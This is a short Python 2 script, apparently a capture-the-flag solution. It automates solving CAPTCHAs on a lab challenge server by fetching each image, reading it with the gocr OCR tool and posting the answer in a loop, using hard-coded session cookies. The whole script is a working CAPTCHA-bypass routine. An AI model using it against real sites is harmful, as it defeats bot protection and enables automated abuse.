import requests, os, time, re, sys

session = requests.session()

#burp0_url = "http://10.3.204.204:80/challenge"
img_url = "http://10.3.204.204:80/image"
submit_url = "http://10.3.204.204:80/challenge"
for i in range(1,1000):
	burp0_cookies = {"fuel_csrf_token": "388155b37e304eb0bf554f7f746b81d982c6c7084059b6ebcec2cad42d1e7194b7780574072023ad19879731826c4d5d0fe2f114e7d715640c73f387ba0a8e39", "fuelcid": "S%3AOM0y5cBp4PxM2yHgkj8ENgxSv8s7DLiNbF9aulz6PbFGxih9ktGXPDvF9WvnbF2Lbm3KtxjuiaYlqTX0dypp2zH7K85XHML1iPmGrCWMB5D8OfW8ZH2MgG5Qc3JwU0hfPr3YjB9ka_teydNMdLtsdiPUcLa9dFYPllewStm-TisiTyQNo212QfRusbJcfiTlqquLg09kwzSRvv_AY6p5qc9T5W72DZUMfdbr_eA4mqjivGcplWQovRnNtipQA1ZtYTRmr_sTJaEzpyZcDDeeqnkHVj2AIXSqF43HTqdoJC8INl_-MpgBAuPBaV_8A39H71A5cu1dniF9xXd60Aw2zhC5U7Vf1S7wrg6v5BccnPpfuLapLKXRFMHlbJoxq-IvWlZt2b068tA61owumk07bP6jRNh1YYibHoFxH7HH-HuhP_DkzzFSMCi7MzG2wFxGhIyhvKzpDT-hIFjkncTJ20dTtru8enQrgW8EKrky7cgnjKn11Zitm5JsVkrfmEXsu4U-coc23iDS-z6icRHNkK4SHglVFF--IqNMw3ttvpUsLBN2N5EUB_QDkxMYtqFMusI4owv3kuLlZqhtrviDbvZirM_yL8-2wIrIA8alzZUlTY3xtyxGiyXBWZ4lCqSJXh-Bu8W24ppLxwtL7gPM4Rpwx39Wy7_vDG2lA8bPGR7b2mAkMbaa0_64u7HJvbZ4bJPRucXoZQGM0U7x6zRdmJPGPSyHV0dk1payP_X-fYOooa9DqhsHicSmo6odRzImwzihOmJK1knqAuHONRNTl9B1Bdt7aunlhHztvYMfkg8q9yLDjDobqLe_uDo23FoHyIutCsd8H8eJt6f57BZWu0Oc"}
	burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Referer": "http://10.3.204.204/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
	flag = True
	while flag:
		flag = False
		img = session.get(img_url,headers=burp0_headers, cookies=burp0_cookies).content
		with open('tmp.png', 'wb') as f:
			f.write(img)
		os.system('gocr -l 0 -i tmp.png > result.txt')
		with open("result.txt", "r") as f:
			captcha = f.readline().rstrip()
		captcha = captcha.replace(' ','')
		captcha = captcha.replace('_','Q')
		captcha = captcha.replace('f','F')
		if "O" in captcha or '0' in captcha:
			flag = True
	 	print "[+] After {}".format(captcha.upper())
		data = {"captcha":captcha}
		pass
	post_cap = session.post(submit_url,data=data,headers=burp0_headers, cookies=burp0_cookies).content
	score =  re.findall("<h2>(.*)</h2>",post_cap)[0]
	print score
	if '<h2>1000/1000</h2>' in post_cap:
		print post_cap
	if '<h2>0/1000</h2>' in post_cap:
		os.system("open tmp.png")
		sys.exit()

'''
0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
'''